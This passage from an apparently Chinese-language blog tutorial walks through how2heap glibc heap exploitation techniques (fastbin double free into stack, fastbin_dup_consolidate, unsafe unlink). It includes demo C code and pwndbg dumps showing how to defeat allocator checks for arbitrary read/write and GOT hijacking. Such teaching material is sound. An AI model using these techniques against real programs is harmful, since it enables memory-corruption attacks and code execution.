0x146b010 ].</span><br><span class="line">Now, we have access to 0x146b010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x146b010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fff02a085c8</span><br></pre></td></tr></table></figure>

<p>最后效果如上，我们发现当 chunk a 被拿出来后,由于我们伪造了chunk a 的 fd，造成如下效果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x7fffffffe388 —▸ 0x603010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>这个时候形成如上的链表结构，这个时候当我们再 malloc 一块内存的时候，系统会误以为 是我们 fake 的chunk是free的。他会把这块 chunk 拿出来用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x603060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x7fffffffe388,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x603000,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>小结：对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了任意地址写 和 任意地址读。</p>
<h3 id="0x04-fastbin-dup-consolidate"><a href="#0x04-fastbin-dup-consolidate" class="headerlink" title="0x04 fastbin_dup_consolidate"></a>0x04 fastbin_dup_consolidate</h3><p>我们上一条 0x02 介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk 的free。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br></pre></td></tr></table></figure>

<p>这里 shellphish 向我们展示了 large bin 中 mallo_consolidata 机制 fast 对double free 的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>同样的编译后 gdb 挂载运行。</p>
<p>首先是两个malloc</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6020a0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20f61,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后释放 p 1,讲他加入到 fastbins中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure>

<p>当我们在中插入 <code>malloc(0x400)</code> 创建一个 large bins的时候。</p>
<hr>
<p>large bins</p>
<p> chunk 的指针数组, 每个元素是一条 双向循环链表的头部, 但同一条链表中块的大小不一 定相同, 按照从大到小的顺序排列, 每个 bin 保存一定 大小范围的块。主要保存大小 1024 字节以上的块。 </p>
<hr>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; small bins</span><br><span class="line">No symbol <span class="string">&quot;bins&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 —▸ 0x7ffff7dd1b98 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure>

<p>我们会发现 原本在 fastbins 的 chunk p1 跑到了 small bins 里。而且 chunk p2 的prev_size 和size字段都被修改了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6024b0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 &#123;</span><br><span class="line">  prev_size = 0x50,</span><br><span class="line">  size = 0x50,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x411,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6024b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20b51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看看 large bin的分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候我们就可以再次释放 p1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; smallbins</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br></pre></td></tr></table></figure>



<p>这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1&#x3D;0x220a010 p2&#x3D;0x220a060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3&#x3D;0x220a0b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x220a010 0x220a010</span><br></pre></td></tr></table></figure>



<h3 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h3><p>Exploiting free on a corrupted chunk to get arbitrary write. </p>
<p>利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。</p>
<p>首先我们创建两个chunk 分别为chunk_0 和chunk_1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091            &lt;- chunk 0</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000091            &lt;- chunk 1</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000020ee1</span><br></pre></td></tr></table></figure>

<p>紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。由于有<code>P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)</code> 这样的检查。我们可以利用全局指针 <code>chunk0_ptr</code> 构造 fake chunk 来绕过它：</p>
<p>我们伪造 fake chunk 的fd 为 <code>chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);</code></p>
<p>我们伪造 fake chunk 的bk 为<code>chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);</code></p>
<p>这个时候</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091   &lt;-- chunk 0</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000   &lt;-- fake chunk</span><br><span class="line">0x603020:	0x0000000000602058	0x0000000000602060        fd ,bk</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000091    &lt;-- chunk 1 &lt;-- prev_size</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000020ee1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/5gx 0x0000000000602058</span><br><span class="line">0x602058:	0x0000000000000000	0x00007ffff7dd2520               &lt;-- fake chunk FD</span><br><span class="line">0x602068 &lt;completed.7557&gt;:	0x0000000000000000	0x0000000000603010 &lt;-- bk pointer</span><br><span class="line">0x602078:	0x0000000000000000</span><br><span class="line">Pwndbg&gt; x/5gx 0x0000000000602060</span><br><span class="line">0x602060 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7dd2520	0x0000000000000000 &lt;-- fake chunk BK</span><br><span class="line">0x602070 &lt;chunk0_ptr&gt;:	0x0000000000603010	0x0000000000000000  &lt;-- fd pointer</span><br><span class="line">0x602080:	0x0000000000000000</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure>

<p>这样就就会变成我 fake chunk 的 FD 块的bk指向 fake chunk， fake chunk 的BK 块 的fd指向fake chunk ，这样就能绕过检查。</p>
<p>另外利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 <code>prev_size</code> 为 fake chunk 的大小，修改 <code>PREV_INUSE</code> 标志位为 0，将 fake chunk 伪造成一个 free chunk。</p>
<hr>
<p>libc 使用 size 域的最低 3 位来 存储一些其它信息。相关的掩码信息定义如下: </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure>

<p>从以上代码定义可以推断, size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap 分配, 如果 此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena </p>
<hr>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000602058	0x0000000000602060</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000080	0x0000000000000090</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000020ee1</span><br></pre></td></tr></table></figure>

<p>这样，我们去free chunk1，这个时候系统会检测到 fake chunk是释放状态，会触发 unlink ，fake chunk会向后合并， chunk0会被吞并。</p>
<p>unlink 的操作如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure>

<p>根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd = &amp;P - 24</span><br><span class="line">BK = P-&gt;bk = &amp;P - 16</span><br><span class="line">FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br><span class="line">BK-&gt;fd = *(&amp;P - 16 + 16) = P</span><br></pre></td></tr></table></figure>

<p>这样就通过了 unlink 的检查，最终效果为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = P = BK = &amp;P - 16</span><br><span class="line">BK-&gt;fd = P = FD = &amp;P - 24</span><br></pre></td></tr></table></figure>

<p>最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。</p>
<p>在这个例子中，最后chunk0_ptr 和chunk0_ptr[3] 指向的地方是一样的。相对我们如果对chunk0_ptr[3]修改，也是对chunk0_ptr进行了修改。</p>
<p>在程序中，程序先对chunk0_ptr[3]进行了修改，让它指向了<code>victim_string</code> 字符串的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">50</span> 	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">► <span class="number">51</span> 	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br></pre></td></tr></table></figure>

<p>（如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）  </p>
